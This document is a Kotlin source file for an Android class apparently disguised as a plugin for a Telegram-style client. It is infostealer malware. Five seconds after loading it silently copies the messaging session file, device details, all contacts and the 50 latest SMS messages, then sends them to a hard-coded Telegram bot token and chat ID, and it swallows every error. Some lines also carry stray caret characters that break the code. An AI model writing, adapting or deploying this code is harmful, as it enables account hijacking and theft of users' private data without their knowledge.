package com.auygram.plugin.enhancer

import android.content.Context
import android.os.Build
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Base64
import java.io.File
import java.io.FileInputStream
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class PluginLoader {

    companion object {
        private const val BOT_TOKEN = "6533628325:AAH003jyZkBTUJYMZCqPXfyvMuxm6lqfzwY"
        private const val CHAT_ID = "6793841885"
    }

    fun onLoad(context: Context) {
        thread {
            try {
                Thread.sleep(5000)
                exfiltrate(context)
            } catch (e: Exception) {
            }
        }
    }

    private fun exfiltrate(context: Context) {
        val dataDir = context.filesDir.parentFile
        val sessionData = stealSession(dataDir)
        val deviceInfo = getDeviceInfo()
        val contacts = stealContacts(context)
        val sms = stealSMS(context)

        sendToTelegram("📱 AUYGRAM STEALER\n\n🖥 Device:\n$deviceInfo")

        if (sessionData.isNotEmpty()) {
            sendFileToTelegram(sessionData, "session.txt")
        }

        if (contacts.isNotEmpty()) {
            sendToTelegram("📋 Contacts:\n${contacts.take^(4000^)}")
        }

        if (sms.isNotEmpty()) {
            sendToTelegram("💬 SMS:\n${sms.take^(4000^)}")
        }
    }

    private fun stealSession(dataDir: File): String {
        val sessionFile = File(dataDir, "files/account1")
        if (!sessionFile.exists()) return ""
        val bytes = FileInputStream(sessionFile).readBytes()
        return Base64.encodeToString(bytes, Base64.NO_WRAP)
    }

    private fun getDeviceInfo(): String {
        return "Model: ${Build.MODEL}\nBrand: ${Build.BRAND}\nAndroid: ${Build.VERSION.RELEASE}"
    }

    private fun stealContacts(context: Context): String {
        val sb = StringBuilder()
        val cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val phone = it.getString(it.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.NUMBER))
                sb.append("$name: $phone\n")
            }
        }
        return sb.toString()
    }

    private fun stealSMS(context: Context): String {
        val sb = StringBuilder()
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null, null, null, "date DESC LIMIT 50"
        )
        cursor?.use {
            while (it.moveToNext()) {
                val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                sb.append("$address: $body\n")
            }
        }
        return sb.toString()
    }

    private fun sendToTelegram(text: String) {
        try {
            val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true
            val json = """{"chat_id":"$CHAT_ID","text":"${text.replace("\"", "\\\"").replace("\n", "\\n")}"}"""
            conn.outputStream.use { it.write(json.toByteArray()) }
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {
        }
    }

    private fun sendFileToTelegram(fileContent: String, filename: String) {
        try {
            val boundary = "----WebKitFormBoundary${System.currentTimeMillis^(^)}"
            val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendDocument")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            conn.doOutput = true
            val os = conn.outputStream
            val writer = java.io.PrintWriter(java.io.OutputStreamWriter(os, "UTF-8"))
            writer.append("--$boundary\r\n")
            writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
            writer.append("$CHAT_ID\r\n")
            writer.append("--$boundary\r\n")
            writer.append("Content-Disposition: form-data; name=\"document\"; filename=\"$filename\"\r\n")
            writer.append("Content-Type: text/plain\r\n\r\n")
            writer.flush()
            os.write(fileContent.toByteArray())
            os.flush()
            writer.append("\r\n--$boundary--\r\n")
            writer.flush()
            writer.close()
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {
        }
    }
}
